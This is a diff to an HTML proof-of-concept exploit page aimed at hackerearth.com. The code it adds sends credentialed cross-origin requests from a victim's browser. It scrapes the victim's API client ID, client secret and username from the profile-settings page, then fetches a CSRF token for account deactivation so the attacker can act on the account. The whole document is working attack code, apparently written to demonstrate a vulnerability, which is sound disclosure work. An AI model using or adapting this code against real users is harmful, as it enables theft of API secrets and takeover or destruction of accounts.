@@ -5,7 +5,11 @@
 <div>
 <h1>Getting hackerearth Client secrets for victim!!!</h1>
 <button type="button" onclick="loadDoc()">Get secrets!!!</button>
-  <div id="demo"></div>
+  <div id="demo1"></div>
+  <div id="demo2"></div>
+  <div id="demo3"></div>
+<button type="button" onclick="get_csrf_token()">You can get any csrf token and make changes in victim account like this is account deactivate csrf token!!!</button>
+  <div id="demo4"></div>
 </div>
 
 <script>
@@ -13,14 +17,39 @@ function loadDoc() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
-        document.getElementById("demo").innerHTML = this.responseText;
+        var parser=new DOMParser();
+        var xmlDoc=parser.parseFromString(this.responseText, "text/html").documentElement;
+        var clientId = xmlDoc.querySelector('#client-id');
+        var clientSecret = xmlDoc.querySelector('#client-secret');
+        var username = xmlDoc.querySelector('#change-username');
+        document.getElementById("demo1").innerHTML = clientId.innerText;
+        document.getElementById("demo2").innerHTML = clientSecret.innerText;
+        document.getElementById("demo3").innerHTML = username.innerText.replace('Edit','');;
+        
     }
   };
   xhttp.open("GET", "https://www.hackerearth.com/users/profile-settings/", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
-
+function get_csrf_token(){
+  var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        var parser=new DOMParser();
+        var xmlDoc= parser.parseFromString(this.responseText, "text/html").documentElement;
+        var csrf = xmlDoc.querySelector('#deactivate-form')[0].value;
+      document.getElementById("demo4").innerHTML = "csrf for deactivate account : " + csrf;
+    }
+  };
+  var username = document.getElementById("demo3").innerText;
+  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","");;
+  xhttp.open("GET", url, true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+  
+  
 </script>
 
 </body>
